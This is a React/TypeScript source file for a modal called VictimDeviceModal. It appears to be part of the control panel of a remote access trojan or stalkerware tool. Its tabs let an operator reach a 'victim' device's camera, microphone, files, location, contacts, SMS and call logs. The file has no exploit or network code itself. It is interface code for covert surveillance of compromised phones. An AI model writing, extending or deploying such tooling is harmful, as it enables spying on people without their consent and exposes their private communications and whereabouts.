import './styles.scss';

import {
    Button,
    Dialog,
    DialogBody,
    DialogContent,
    DialogSurface,
    DialogTitle,
    DialogTrigger,
} from '@fluentui/react-components';
import { Dismiss24Regular } from '@fluentui/react-icons';
import { observer } from 'mobx-react-lite';
import React, { useState } from 'react';

import { VictimOrder } from '../../../common/enums';
import { type VictimDeviceItem } from '../../store';
import { CallsTab } from './CallsTab';
import { CameraTab } from './CameraTab';
import { ContactsTab } from './ContactsTab';
import { FileManagerTab } from './FileManagerTab';
import { LocationTab } from './LocationTab';
import { MicrophoneTab } from './MicrophoneTab';
import { SMSTab } from './SMSTab';
import { TabListWithOverflow } from './TabListWithOverflow';

interface IProps {
    data?: VictimDeviceItem;
    open: boolean;
    setOpen: (open: boolean) => void;
}

export interface ITabProps {
    data: VictimDeviceItem;
}

export const VictimDeviceModal: React.FC<IProps> = observer((props) => {
    const [selectedTab, setSelectedTab] = useState(VictimOrder.CAMERA);

    return (
        <Dialog
            modalType='modal'
            open={props.open}
            onOpenChange={(_, data) => {
                props.setOpen(data.open);
            }}
        >
            <DialogSurface className='victim-device-modal'>
                <DialogBody>
                    <DialogTitle
                        action={
                            <DialogTrigger action='close'>
                                <Button
                                    appearance='transparent'
                                    aria-label='close'
                                    icon={<Dismiss24Regular />}
                                />
                            </DialogTrigger>
                        }
                    >
                        <TabListWithOverflow
                            selectedTab={selectedTab}
                            setSelectedTab={setSelectedTab}
                        />
                    </DialogTitle>
                    <DialogContent>
                        {props.data !== undefined &&
                            (selectedTab === VictimOrder.CAMERA ? (
                                <CameraTab data={props.data} />
                            ) : selectedTab === VictimOrder.FILE_MANAGER ? (
                                <FileManagerTab data={props.data} />
                            ) : selectedTab === VictimOrder.MICROPHONE ? (
                                <MicrophoneTab data={props.data} />
                            ) : selectedTab === VictimOrder.LOCATION ? (
                                <LocationTab data={props.data} />
                            ) : selectedTab === VictimOrder.CONTACTS ? (
                                <ContactsTab data={props.data} />
                            ) : selectedTab === VictimOrder.SMS ? (
                                <SMSTab data={props.data} />
                            ) : selectedTab === VictimOrder.CALLS ? (
                                <CallsTab data={props.data} />
                            ) : null)}
                    </DialogContent>
                </DialogBody>
            </DialogSurface>
        </Dialog>
    );
});
